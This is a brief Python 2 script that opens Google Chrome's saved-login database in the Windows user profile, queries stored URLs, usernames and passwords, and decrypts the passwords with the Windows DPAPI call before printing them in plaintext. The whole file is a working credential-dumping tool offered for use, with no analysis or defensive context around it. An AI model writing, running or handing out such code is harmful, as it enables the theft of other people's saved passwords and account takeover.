#Download and Install Pywin32 from http://sourceforge.net/projects/pywin32/files/pywin32/
#To use this script

from os import getenv
import win32crypt
import sqlite3



def getChromeTablePath():

	appdata = getenv("APPDATA")
	dbpath = appdata+"\..\Local\Google\Chrome\User Data\Default\Login Data"

	return dbpath

def getDataFromTable(dbPath):
	# Make a database connection
	conn = sqlite3.connect(dbPath)
	cursor = conn.cursor()
	#  Run query
	cursor.execute('SELECT action_url, username_value, password_value FROM logins')

	return cursor


def getPasswords():
	
	dbPath = getChromeTablePath()
	rows = getDataFromTable(dbPath)

	for row in rows:
		#refer http://docs.activestate.com/activepython/2.7/pywin32/win32crypt__CryptUnprotectData_meth.html
		print row[0], row[1], win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]

if __name__ == "__main__":
    getPasswords()